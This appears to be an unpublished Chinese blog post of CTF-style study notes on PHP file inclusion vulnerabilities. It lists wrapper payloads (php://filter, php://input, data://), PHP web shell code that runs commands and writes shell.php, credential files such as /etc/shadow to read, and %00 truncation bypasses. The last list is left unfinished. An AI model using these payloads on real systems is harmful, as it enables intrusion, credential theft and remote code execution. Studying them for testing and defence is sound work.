---
layout: post
title: File Include
subtitle: 文件包含漏洞
date: 2025-06-19 11:55
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags: 
published: false
---
### 文件包含伪协议

#### file://

用于读取本地文件，必须使用绝对路径，php项目读取php文件时会执行其中代码，导致无法读取到源码。

```php
file:///etc/passwd
file://C:\Windows\System32\drivers\etc\hosts
file:///windows/system32/drivers/etc/hosts
```
#### php://filter

读取指定资源，可以是本地也可以是远程资源，可指定编码类型对内容编码，在读取php文件时可防止其运行，从而读取源码。

```php
php://filter/ {operation}={filter_chain}/resource={source}
php://filter/read=convert.base64-encode/resource=http://www.baidu.com
php://filter/convert.base64-encode/resource=http://www.baidu.com
php://filter/resource=http://www.baidu.com
php://filter/resource=../index.php

operation: read write
filter-chain: convert.base64-encode convert.base64-decode
```
#### php://input

用于读取原始的 POST 请求数据

```php
php://input

POST数据：
<?php eval($_POST['cmd']);?>
<?php fputs(fopen('shell.php','w'),'<?php @eval($_REQUEST["cmd"]);?>');?>
```
#### data://

用于在 URL 中嵌入小块数据

```php
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
data://a/b,<?php phpinfo();?>
https://7cdbe539-f220-4021-ac93-fd10996d0f13.challenge.ctf.show
```
#### zlib://

```php
compress.zlib://shell.php.gz
```

### 敏感文件

```
/etc/shadow(存放密码)
/etc/gshadow(存放密码)
/etc/profile(系统环境)
/etc/group(组的数据库文件)
/etc/my.conf(MYSQL配置信息)
/usr/etc/php.ini(PHP配置信息)
/etc/crontab(crontab配置文件)
/etc/passwd(系统用户数据库文件)
/etc/httpd/conf/httpd.conf(Apache配置信息)
```

### 文件包含绕过

1. %00截断

```
?filename=file:///var/log/httpd/access_log%00
```

1. %23截断
2. session文件包含
	session文件保存位置：`/var/lib/php/session`，文件名`sess_xxxx`
3. 
